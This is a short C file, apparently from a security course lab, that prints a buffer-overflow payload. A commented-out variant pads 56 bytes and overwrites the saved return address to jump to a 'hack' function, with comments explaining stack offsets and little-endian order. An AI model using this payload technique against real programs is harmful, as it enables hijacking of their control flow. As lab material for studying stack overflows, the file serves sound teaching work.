#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

/**
 * The exploit string that will be written to stdout
 *
 * \x is the escape character that makes gcc interpret the coming
 * characters as hexadecimal values (not as ASCII characters). The sequence of
 * bytes in "exploit" will exactly match the bytes you denote in hex (and thus binary).
 *
 * 1 byte is represented with 2 hex numbers
 * 1 byte --> 8 bits --> [0 - 255] : [0000 0000 - 1111 1111] : [00 - FF]
 *
 * https://www.w3resource.com/convert/number/hex-to-binary.php
 *
 * So if we wanted to write 2 bytes of all 1s we would write
 *
 * "\xFF\xFF" --> 1111 1111 1111 1111
 *
 */

const char exploit[] = "\x00\x00\x00\x00\x00\x00\x00\x00"
                       "\x00\x00\x00\x00\x00\x00\x00\x00"
                       "\x00\x00\x00\x00\x00\x00\x00\x00"
                       "\x00\x00\x00\x00\x00\x00\x00\x00"
                       "\x00\x00\x00\x00\x00\x00\x00\x00"
                       "\x00\x00\x00\x00\x83";

// For attack 2, have to figure out what value to put in rip -> instruction pointer and it's offset, at which value to put.
// Stack grows downward -> memory address decrease downward and increases upward.
// Figure out the offset ( stack pointer is 48 ) and offset for base pointer is 8 bytes so total 56 bytes.
// From 57th byte onward, instruction pointer byte starts i.e from lsb to msb for little endian and we have to put our function address there, which is hack -> 0x0000000000401156, start filling it from LSB to MSB i.e 56, 11, 40 in hex. ( LSB must be at lowest address ).

// const char exploit[] = "\x00\x00\x00\x00\x00\x00\x00\x00"
//                        "\x00\x00\x00\x00\x00\x00\x00\x00"
//                        "\x00\x00\x00\x00\x00\x00\x00\x00"
//                        "\x00\x00\x00\x00\x00\x00\x00\x00"
//                        "\x00\x00\x00\x00\x00\x00\x00\x00"
//                        "\x00\x00\x00\x00\x00\x00\x00\x00"
//                        "\x00\x00\x00\x00\x00\x00\x00\x00"
//                         "\x56\x11\x40";
//


/**
 * Write the exploit bytes to stdout
 */
int main(int argc, char** argv)
{

    // strings are null terminated so we write the sizeof the exploit string minus 1
    // to only write out the bytes specified
    write(STDOUT_FILENO,exploit,sizeof(exploit) -1);

    // free(e);
    return 0;


}
